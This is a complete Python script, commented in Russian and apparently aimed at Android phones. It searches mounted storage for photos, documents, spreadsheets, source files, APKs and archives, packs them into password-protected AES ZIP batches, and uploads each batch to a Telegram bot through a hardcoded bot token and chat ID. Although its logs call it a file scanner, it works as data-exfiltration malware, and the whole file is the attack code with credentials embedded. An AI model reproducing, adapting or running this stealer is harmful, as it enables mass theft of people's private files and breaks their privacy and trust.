import os
import pyzipper
import requests
import logging
import time
from datetime import datetime

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('file_scanner.log'),
        logging.StreamHandler()
    ]
)

# Конфигурация
BOT_TOKEN = "8140459609:AAGsjiHT6QQm9fwLMNWQuhzcHdjytIX7Qik"
CHAT_ID = "7656244130"
ZIP_PASSWORD = "Fop4ik20"
MAX_ZIP_SIZE = 1.6 * 1024 * 1024 * 1024  # 1.6 ГБ
MAX_RETRIES = 3  # Максимальное количество попыток отправки
BATCH_SIZE = 60  # Количество файлов в одном архиве

# Черный список директорий
EXCLUDE_DIRS = {
    '/proc', '/sys', '/dev', '/run', '/tmp',
    '/acct', '/cache', '/d', '/data', '/mnt/secure',
    '/mnt/vendor', '/system', '/config', '/apex',
    '/linkerconfig', '/lost+found', '/storage/emulated/0/Android'
}

# Целевые расширения файлов
TARGET_EXTENSIONS = [
    '.jpg', '.jpeg', '.png', '.gif', '.pdf', 
    '.doc', '.docx', '.xls', '.xlsx', '.txt',
    '.py', '.json', '.mp4', '.webp', '.apk',
    '.csv', '.xml', '.zip', '.rar', '.7z'
]

def find_mounted_devices():
    """Поиск всех смонтированных устройств"""
    mount_points = []
    try:
        with open('/proc/mounts', 'r') as f:
            for line in f:
                parts = line.split()
                if len(parts) > 1 and parts[1].startswith(('/mnt', '/storage', '/media', '/sdcard')):
                    mount_points.append(parts[1])
    except Exception as e:
        logging.error(f"Ошибка чтения точек монтирования: {e}")
    
    # Добавление стандартных путей для Android
    android_paths = [
        '/storage/emulated/0',
        '/sdcard',
        '/external_sd',
        '/storage/sdcard1'
    ]
    
    return list(set(mount_points + android_paths))

def safe_file_walk(path):
    """Безопасный обход директорий"""
    try:
        for root, dirs, files in os.walk(path, followlinks=False):
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in EXCLUDE_DIRS]
            yield root, dirs, files
    except Exception as e:
        logging.warning(f"Ошибка доступа к {path}: {str(e)}")

def find_target_files():
    """Поиск целевых файлов на всех устройствах"""
    found_files = []
    devices = find_mounted_devices()
    
    for device in devices:
        logging.info(f"Сканирование устройства: {device}")
        try:
            if not os.path.exists(device):
                continue
                
            for root, _, files in safe_file_walk(device):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            found_files.append(file_path)
        except Exception as e:
            logging.error(f"Ошибка сканирования {device}: {str(e)}")
    
    return found_files

def send_to_telegram(zip_path):
    """Отправка архива в Telegram"""
    for attempt in range(MAX_RETRIES):
        try:
            file_size = os.path.getsize(zip_path)
            if file_size > 50 * 1024 * 1024:
                logging.error("Файл слишком большой для Telegram (>50MB)")
                return False

            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(zip_path, 'rb') as f:
                response = requests.post(
                    url,
                    files={'document': (os.path.basename(zip_path), f)},
                    data={'chat_id': CHAT_ID},
                    timeout=300
                )

            if response.status_code == 200:
                return True
            logging.error(f"Ошибка {response.status_code}: {response.text}")
        except Exception as e:
            logging.error(f"Ошибка отправки: {str(e)}")
        
        if attempt < MAX_RETRIES - 1:
            time.sleep(5)
    
    return False

def create_secure_zip(files, zip_name):
    """Создание защищенного ZIP-архива"""
    try:
        with pyzipper.AESZipFile(
            zip_name,
            'w',
            compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES
        ) as zf:
            zf.setpassword(ZIP_PASSWORD.encode('utf-8'))
            for file in files:
                try:
                    if os.path.getsize(zip_name) > MAX_ZIP_SIZE:
                        break
                    zf.write(file, os.path.basename(file))
                except Exception as e:
                    logging.error(f"Ошибка добавления {file}: {str(e)}")
        return True
    except Exception as e:
        logging.error(f"Ошибка создания архива: {str(e)}")
        return False

def cleanup(*files):
    """Удаление временных файлов"""
    for file in files:
        try:
            if file and os.path.exists(file):
                os.remove(file)
        except Exception as e:
            logging.error(f"Ошибка удаления {file}: {str(e)}")

def main():
    """Основная функция"""
    logging.info("Запуск системы Load...")
    
    try:
        files = find_target_files()
        if not files:
            logging.info("Файлы не найдены")
            return
            
        logging.info(f"Найдено файлов: {len(files)}")
        
        # Разбиваем файлы на пакеты
        for i in range(0, len(files), BATCH_SIZE):
            batch = files[i:i + BATCH_SIZE]
            zip_name = f"archive_{i//BATCH_SIZE}.zip"
            
            if create_secure_zip(batch, zip_name):
                if send_to_telegram(zip_name):
                    logging.info(f"Успешно скачан архив {zip_name}")
                    cleanup(zip_name)
                else:
                    logging.error(f"Не удалось отправить {zip_name}")
            else:
                logging.error(f"Ошибка создания {zip_name}")
                
    except Exception as e:
        logging.error(f"Критическая ошибка: {str(e)}")

if __name__ == "__main__":
    main()